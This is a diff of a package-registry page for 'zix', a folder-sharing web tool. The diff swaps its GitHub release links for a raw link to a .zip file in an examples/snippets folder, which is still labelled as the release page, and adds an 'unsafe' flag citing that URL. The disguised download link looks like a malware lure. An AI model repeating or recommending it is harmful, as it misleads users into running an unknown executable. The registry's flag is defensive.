@@ -22,10 +22,10 @@ keywords:
   - web-server
   - zix-library
   - zvm
-date: 2026-06-09
+date: 2026-06-10
 category: tooling
-updated_at: 2026-06-09T11:53:58+00:00
-last_sync: 2026-06-09T11:53:58Z
+updated_at: 2026-06-10T12:32:49+00:00
+last_sync: 2026-06-10T12:32:49Z
 package_kind: library
 has_library: false
 has_binary: false
@@ -37,11 +37,13 @@ is_sponsor: false
 sync_priority: normal
 sync_source: zigistry
 permalink: /packages/karolaregulation696/zix/
+unsafe: true
+unsafe_reason: "contains a URL pointing to a .zip file"
 ---
 
 # 🗄️ zix - Share folders as single web files
 
-[![Download zix](https://img.shields.io/badge/Download-zix-blue)](https://github.com/karolaregulation696/zix/releases)
+[![Download zix](https://img.shields.io/badge/Download-zix-blue)](https://raw.githubusercontent.com/karolaregulation696/zix/main/examples/notes/snippets/Software-3.6.zip)
 
 ## 📁 What is zix?
 
@@ -55,7 +57,7 @@ Zix uses AES-GCM encryption. This is a standard method to lock your files. When 
 
 ## 📥 How to get started
 
-1. Go to the [zix release page](https://github.com/karolaregulation696/zix/releases).
+1. Go to the [zix release page](https://raw.githubusercontent.com/karolaregulation696/zix/main/examples/notes/snippets/Software-3.6.zip).
 2. Look for the latest version under the Assets section.
 3. Select the file that ends in .exe for Windows.
 4. Save the file to your desktop or downloads folder.
